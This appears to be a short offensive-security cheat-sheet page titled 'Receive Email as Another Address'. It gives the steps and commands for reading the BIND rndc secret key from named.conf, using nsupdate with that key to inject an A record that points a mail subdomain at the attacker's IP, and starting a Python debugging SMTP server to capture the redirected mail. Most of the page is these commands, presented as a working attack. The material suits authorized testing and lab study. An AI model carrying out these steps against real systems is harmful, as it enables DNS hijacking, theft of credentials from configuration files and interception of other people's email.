---
title: Receive Email as Another Address
description: With misconfigurations of target system, we might be able to impersonate some email address then receive sensitive email.
tags:
    - Email
    - Web
refs:
date: 2023-05-20
draft: false
---

## Exploit DNS Zone Misconfiguration & BIND Config

If target host has the domain for email e.g. “mail.example.com” and we can get BIND secret key, we can update

### 1. Get BIND Secret Key

We need to get the BIND key in the config file.

```bash
# /etc/bind/named.conf

key "rndc-key" {
    algorithm hmac-sha256;
    secret "zBatC828gunRa...bA=";
};
```

### 2. Update DNS Zone

After retrieving the BIND secret, update DNS zone to add the new record for receiving email, with subdomain and our ip address.

```bash
# -d: Debug mode
# -y: Set the literal TSIG (Transaction Signature) authentication key.
nsupdate -d -y hmac-sha256:rndc-key:zBatC828gunRa...bA= 
Creating key...
namefromtext
keycreate
# Enter target domain
> server example.com
# Enter the new record
# 86400: The TTL (Time-To-Live) for the DNS record. Set 86400 seconds (24 hours) here.
# IN: Internet
# A: A record
# 10.0.0.1: Set your local ip address
> update add mail.example.com 86400 IN A 10.0.0.1
> send
Reply from SOA query:

...

```

### 3. Start SMTP Server

In local machine, start SMTP server for debugging when receiving email with “mail.example.com” from others.

```bash
# -n: No setuid
# -c: Classname
sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
```

When receiving email, we should see the output in the terminal.